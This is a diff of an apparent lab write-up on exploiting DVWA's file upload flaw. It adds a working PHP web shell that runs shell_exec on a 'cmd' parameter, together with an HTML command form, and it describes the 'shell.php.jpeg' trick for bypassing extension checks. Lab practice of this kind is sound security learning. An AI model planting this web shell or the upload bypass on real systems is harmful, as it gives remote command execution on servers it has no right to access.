@@ -49,17 +49,36 @@ Created a simple PHP shell:
 
 ```php
 <?php
-if (isset($_REQUEST['cmd'])) {
+// PHP code to handle command execution
+if(isset($_REQUEST['cmd'])) {
     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 }
 ?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Shell</title>
+</head>
+<body>
+    <h1>Web Shell</h1>
+    <form method="get">
+        <label for="cmd">Enter Command:</label>
+        <input type="text" id="cmd" name="cmd">
+        <input type="submit" value="Execute">
+    </form>
+</body>
+</html>
+
 ```
 
 Saved as `shell.php.jpeg` to bypass naive extension checks.
 
 ### 3. Upload & Execution
 - Uploaded payload through DVWA interface  
-- Located it at:  
+- Based on my network set up at that time, I Located it at:  
   ```
   http://192.168.79.8/dvwa/hackable/uploads/shell.php.jpeg
   ```
@@ -91,20 +110,19 @@ An attacker exploiting this could:
 
 ---
 
-## 🖼️ Screenshots
+## 🖼️ POC
 
-_Add screenshots like the ones below once available:_
+![Payload](/assets/DVWA-Web-Shell/DVWAs.jpg)
 
-```markdown
-![Payload Upload Interface](./dvwa-upload-interface.png)
-![Shell Execution Output](./rce-whoami.png)
-```
+--- 
+
+![image](/assets/DVWA-Web-Shell/DVWAi.jpg)
 
 ---
 
 ## 📄 Full Report
 
-📥 [Download the full DVWA Web Shell deployment report (PDF)](./DVWA-Web-Shell.pdf)
+📥 [Download the full DVWA Web Shell deployment report (PDF)](/DVWA-Web-Shell/DVWA-Web-Shell.pdf)
 
 This PDF details all terminal outputs, screenshots, crafted payloads, and step-by-step execution with technical evidence.
 
